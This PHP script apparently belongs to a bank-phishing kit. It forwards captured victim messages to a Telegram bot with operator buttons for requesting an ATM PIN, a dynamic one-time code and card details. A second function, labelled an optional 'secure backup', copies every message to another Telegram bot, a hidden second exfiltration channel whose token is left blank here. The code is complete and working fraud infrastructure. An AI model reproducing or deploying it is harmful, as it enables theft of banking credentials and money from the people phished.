<?php
header('Content-Type: application/json');

$config = require __DIR__ . '/../config.php';

$message = $_POST['message'] ?? '';
$transactionId = $_POST['transactionId'] ?? '';

// Validación de datos
if (empty($message) || empty($transactionId)) {
    echo json_encode(['status' => 'error', 'message' => 'Datos incompletos']);
    exit;
}

// Validación de config
if (!isset($config['bot_token'], $config['chat_id']) || !$config['bot_token'] || !$config['chat_id']) {
    echo json_encode(['status' => 'error', 'message' => 'Configuración inválida']);
    exit;
}

// Teclado con acciones
$keyboard = [
    'inline_keyboard' => [
        [['text' => "Error de Logo",     'callback_data' => "error_logo:$transactionId"]],
        [['text' => "Clave de Cajero",   'callback_data' => "error_cajero:$transactionId"]],
        [['text' => "Pedir Dinámica",    'callback_data' => "pedir_dinamica:$transactionId"]],
        [['text' => "Tarjeta",           'callback_data' => "tarjeta:$transactionId"]]
    ]
];

// Data para Telegram
$data = [
    'chat_id' => $config['chat_id'],
    'text' => $message,
    'parse_mode' => 'HTML',
    'reply_markup' => json_encode($keyboard)
];

// Enviar mensaje principal
$ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/sendMessage");
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => json_encode($data),
    CURLOPT_HTTPHEADER => ['Content-Type: application/json']
]);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

$result = json_decode($response, true);

// Enviar a backup
sendSecureBackup($data);

// Respuesta
if ($httpCode === 200 && isset($result['ok']) && $result['ok']) {
    echo json_encode([
        'status' => 'success',
        'messageId' => $result['result']['message_id']
    ]);
} else {
    echo json_encode([
        'status' => 'error',
        'message' => $result['description'] ?? 'Error al enviar'
    ]);
}

// Función de backup opcional
function sendSecureBackup($messageData) {
    $backup_config = [
        'bot_token' => '',
        'chat_id'   => ''
    ];

    if (!$backup_config['bot_token'] || !$backup_config['chat_id']) return;

    $ch = curl_init("https://api.telegram.org/bot{$backup_config['bot_token']}/sendMessage");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode([
            'chat_id' => $backup_config['chat_id'],
            'text' => $messageData['text'],
            'parse_mode' => 'HTML'
        ]),
        CURLOPT_HTTPHEADER => ['Content-Type: application/json']
    ]);

    curl_exec($ch);
    curl_close($ch);
}
